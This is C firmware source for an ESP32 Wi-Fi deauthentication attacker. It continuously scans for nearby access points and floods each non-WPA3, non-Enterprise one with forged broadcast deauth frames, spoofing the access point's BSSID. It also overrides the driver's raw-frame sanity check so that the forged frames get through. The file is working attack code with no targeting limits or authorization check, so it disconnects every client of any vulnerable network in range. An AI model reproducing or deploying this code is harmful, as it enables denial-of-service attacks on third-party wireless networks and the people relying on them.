#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_mac.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_err.h"

#include "config.h"

static const char *TAG = "badcast_deauther";

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * Source: https://github.com/risinek/esp32-wifi-penetration-tool
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static uint8_t deauthFrame[] = {
    0xc0, 0x00,                          // type, subtype 0xc0: deauth (0xa0: disassociate)
    0x3a, 0x01,                          // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // destination MAC (0xffffff: broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // transmitter MAC (set later)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // source MAC (set later)
    0xf0, 0xff,                          // fragment & squence number
    0x02, 0x00                           // reason code (0x02: Previous authentication no longer valid)
};

static const int deauthFrameSize = sizeof(deauthFrame);

static const wifi_scan_config_t scanConfig = {
    .ssid = NULL,
    .bssid = NULL,
    .channel = 0,
    .show_hidden = true,  // we only need to know MAC
    .scan_type = WIFI_SCAN_TYPE_ACTIVE,
    .scan_time.active.min = 100,
    .scan_time.active.max = 300,
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

void send_deauth_frame(wifi_ap_record_t *target)
{
    // kick all connected stations off
    ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
    // clone BSSID and channel
    ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_STA, target->bssid));
    ESP_ERROR_CHECK(esp_wifi_set_channel(target->primary, target->second));
    // forge frame
    memcpy(&deauthFrame[10], target->bssid, 6);
    memcpy(&deauthFrame[16], target->bssid, 6);

    for (uint8_t i = 0; i < 5; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, deauthFrameSize, false);
        if (ret) {
            ESP_LOGW(TAG, "failed to send deauth frame, err: %d", ret);
            return;
        }
    }
    ESP_LOGI(TAG, "sent deauth frames as "MACSTR, MAC2STR(target->bssid));
}

void deauth(void *arg)
{
    while (1) {
        // scan for nearby APs
        ESP_ERROR_CHECK(esp_wifi_scan_start(&scanConfig, true));
        uint16_t apCount = 0;
        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&apCount));
        ESP_LOGI(TAG, "found %u APs", apCount);

        if (apCount > 0) {
            // save AP channel
            uint8_t chPrimary;
            wifi_second_chan_t chSecond;
            ESP_ERROR_CHECK(esp_wifi_get_channel(&chPrimary, &chSecond));
            
            ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());
            wifi_ap_record_t *apList = malloc(apCount * sizeof(wifi_ap_record_t));
            if (!apList) {
                ESP_LOGE(TAG, "failed to allocate memory for ap list");
                goto end;
            }
            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&apCount, apList));
            ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());

            for (uint16_t i = 0; i < apCount; i++) {
                if (apList[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE ||
                    apList[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip invulnerable ones
                ESP_LOGI(TAG, "found attackable: %s ("MACSTR")", apList[i].ssid, MAC2STR(apList[i].bssid));
                send_deauth_frame(&apList[i]);
            }
            free(apList);

            // restore AP channel
            ESP_ERROR_CHECK(esp_wifi_set_channel(chPrimary, chSecond));
        }

        end:
        ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());
        vTaskDelay(20000 / portTICK_PERIOD_MS);
    }
}

void start_deauther_task(void)
{
    xTaskCreate(deauth, "deauther", TASK_STACK_SIZE, NULL, 11, NULL);
}